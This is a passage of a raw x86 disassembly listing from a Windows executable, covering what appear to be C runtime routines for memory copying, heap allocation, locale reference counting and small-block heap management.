  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
